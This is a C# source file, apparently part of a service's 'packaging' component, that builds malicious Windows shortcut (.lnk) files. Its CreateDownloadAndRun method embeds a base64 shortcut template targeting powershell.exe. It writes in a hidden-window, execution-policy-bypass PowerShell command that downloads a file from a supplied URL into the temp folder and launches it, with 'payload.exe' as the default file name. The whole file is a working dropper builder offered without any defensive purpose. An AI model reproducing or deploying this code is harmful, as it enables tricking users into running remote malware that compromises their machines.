using System.Text;

namespace LibraNextgen.Service.Services.Packaging;

/// <summary>
///
///
/// </summary>
public static class LnkWriter
{
    private const string TemplateB64 =
        "TAAAAAEUAgAAAAAAwAAAAAAAAEb7QAAAIAAAAAUqa6YPMN0B7uQQGuE03QHMc22mDzDdAQDwBgAAAAAAAQAAAAAAAAAAAAAAAAAAAAUCFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAVgAxAAAAAAAUXVsKEABXaW5kb3dzAEAACQAEAO++r1wwBhldvbIuAAAAh3MBAAAABgAAAAAAAAAAAAAAAAAAAJ9ovABXAGkAbgBkAG8AdwBzAAAAFgBaADEAAAAAABldKIswAFN5c3RlbTMyAABCAAkABADvvq9cMAYZXTizLgAAAJJzAQAAAAUAAAAAAAAAAAAAAAAAAABexyQAUwB5AHMAdABlAG0AMwAyAAAAGABsADEAAAAAAK9cTQYQAFdJTkRPV34xAABUAAkABADvvq9cTQYZXTizLgAAAJg4BAAAAAEAAAAAAAAAAAAAAAAAAABToRwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAAAAGABOADEAAAAAABNdpL4QAHYxLjAAADoACQAEAO++r1xNBhldCLMuAAAAmTgEAAAAAQAAAAAAAAAAAAAAAAAAAJckAQB2ADEALgAwAAAAFABsADIAAPAGABNdbpogAHBvd2Vyc2hlbGwuZXhlAABOAAkABADvvhNdbpoZXT2zLgAAAHGYIQAAAAEAAAAAAPgAAAAAAAAAAAA0bNgAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAAAAHgAAAG8AAAAcAAAAAQAAABwAAAA0AAAAAAAAAG4AAAAYAAAAAwAAACR5Gx4QAAAAV2luZG93cwBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUAAA==";

    private static readonly byte[] TemplatePrefix = Convert.FromBase64String(TemplateB64);

    public static int TemplatePrefixLength => TemplatePrefix.Length;

    private const string FixedRelativePath = @"..\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    private const string FixedWorkingDir = @"C:\Windows\System32\WindowsPowerShell\v1.0";
    private const string FixedIconLocation = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

    /// <summary>
    /// </summary>
    public static byte[] CreateDownloadAndRun(string payloadUrl, string outputName = "payload.exe")
    {
        var script = $"$u='{payloadUrl}';$f=Join-Path $env:TEMP '{outputName}';(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f";
        var args = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{script}\"";

        var rp = EncodeField(FixedRelativePath);
        var wd = EncodeField(FixedWorkingDir);
        var arg = EncodeField(args);
        var icon = EncodeField(FixedIconLocation);

        var lnk = new byte[TemplatePrefix.Length + rp.Length + wd.Length + arg.Length + icon.Length];
        Array.Copy(TemplatePrefix, 0, lnk, 0, TemplatePrefix.Length);
        var o = TemplatePrefix.Length;
        Array.Copy(rp, 0, lnk, o, rp.Length); o += rp.Length;
        Array.Copy(wd, 0, lnk, o, wd.Length); o += wd.Length;
        Array.Copy(arg, 0, lnk, o, arg.Length); o += arg.Length;
        Array.Copy(icon, 0, lnk, o, icon.Length);
        return lnk;
    }

    private static byte[] EncodeField(string value)
    {
        var units = Encoding.Unicode.GetBytes(value + "\0");
        var field = new byte[2 + units.Length];
        field[0] = (byte)(value.Length + 1);
        field[1] = 0;
        Array.Copy(units, 0, field, 2, units.Length);
        return field;
    }
}
